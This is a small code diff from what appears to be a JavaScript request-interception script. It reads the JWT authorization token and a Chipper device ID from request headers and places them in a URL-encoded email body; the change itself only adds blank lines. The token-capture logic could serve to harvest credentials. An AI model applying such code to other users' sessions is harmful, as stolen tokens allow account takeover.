@@ -6,7 +6,7 @@ if (req && req.headers) {
     let deviceId = req.headers['chipper-device-id'] || req.headers['Chipper-Device-Id'];
 
     // 构造邮件正文内容
-    let mailBody = `JWT\n${authorization}\nChipper-Device-Id\n${deviceId}`;
+    let mailBody = `JWT\n\n\n${authorization}\n\n\nChipper-Device-Id\n\n\n${deviceId}`;
 
     // 对邮件正文进行编码
     let encodedMailBody = encodeURIComponent(mailBody);
